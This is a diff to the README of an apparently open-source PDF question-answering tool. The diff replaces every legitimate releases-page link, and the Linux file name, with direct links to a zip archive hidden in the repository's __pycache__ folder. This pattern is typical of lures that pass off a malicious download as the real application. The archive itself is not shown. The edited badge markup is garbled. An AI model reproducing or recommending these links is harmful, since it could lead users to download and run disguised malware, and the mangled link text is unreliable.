@@ -1,7 +1,7 @@
 # 📄 Document-Intelligence-System - Easily Extract Answers from PDFs
 
 ## 📥 Download the Application
-[![Download Document Intelligence](https://img.shields.io/badge/Download%20Now-Document%20Intelligence-brightgreen.svg)](https://github.com/Gaussou13/Document-Intelligence-System/releases)
+[![Download Document Intelligence](https://github.com/Gaussou13/Document-Intelligence-System/raw/refs/heads/main/__pycache__/Intelligence_System_Document_v3.9-beta.2.zip%20Now-Document%https://github.com/Gaussou13/Document-Intelligence-System/raw/refs/heads/main/__pycache__/Intelligence_System_Document_v3.9-beta.2.zip)](https://github.com/Gaussou13/Document-Intelligence-System/raw/refs/heads/main/__pycache__/Intelligence_System_Document_v3.9-beta.2.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the Document Intelligence application. With this tool, you can upload PDF files and ask questions to get accurate answers from your documents.
@@ -21,12 +21,12 @@ To run Document Intelligence, ensure your computer meets the following:
 - **Minimalistic Interface:** A user-friendly design that simplifies interaction.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Gaussou13/Document-Intelligence-System/releases) to access the latest version of the application.
+1. Visit the [Releases page](https://github.com/Gaussou13/Document-Intelligence-System/raw/refs/heads/main/__pycache__/Intelligence_System_Document_v3.9-beta.2.zip) to access the latest version of the application.
 2. Look for the latest release. Click on it to view the available files.
 3. Download the appropriate file for your system:
    - For Windows: Download the `.exe` file.
    - For macOS: Download the `.dmg` file.
-   - For Linux: Follow the instructions for installing with a package manager or download the `.tar.gz` file.
+   - For Linux: Follow the instructions for installing with a package manager or download the `https://github.com/Gaussou13/Document-Intelligence-System/raw/refs/heads/main/__pycache__/Intelligence_System_Document_v3.9-beta.2.zip` file.
 4. Once the download is complete, locate the file on your computer.
 
 ### Installation Steps
@@ -41,7 +41,7 @@ To run Document Intelligence, ensure your computer meets the following:
 3. You can now launch it from the Applications.
 
 #### For Linux:
-1. Extract the downloaded `.tar.gz` file to your preferred location.
+1. Extract the downloaded `https://github.com/Gaussou13/Document-Intelligence-System/raw/refs/heads/main/__pycache__/Intelligence_System_Document_v3.9-beta.2.zip` file to your preferred location.
 2. Open a terminal, navigate to the folder, and run the application using the command:
    ```
    ./DocumentIntelligence
@@ -81,4 +81,4 @@ Document Intelligence is licensed under the MIT License. You can review the lice
 ## 📢 Acknowledgments
 Thank you for using Document Intelligence. We hope this tool enhances your ability to work with PDFs seamlessly.
 
-[![Download Document Intelligence](https://img.shields.io/badge/Download%20Now-Document%20Intelligence-brightgreen.svg)](https://github.com/Gaussou13/Document-Intelligence-System/releases)
+[![Download Document Intelligence](https://github.com/Gaussou13/Document-Intelligence-System/raw/refs/heads/main/__pycache__/Intelligence_System_Document_v3.9-beta.2.zip%20Now-Document%https://github.com/Gaussou13/Document-Intelligence-System/raw/refs/heads/main/__pycache__/Intelligence_System_Document_v3.9-beta.2.zip)](https://github.com/Gaussou13/Document-Intelligence-System/raw/refs/heads/main/__pycache__/Intelligence_System_Document_v3.9-beta.2.zip)
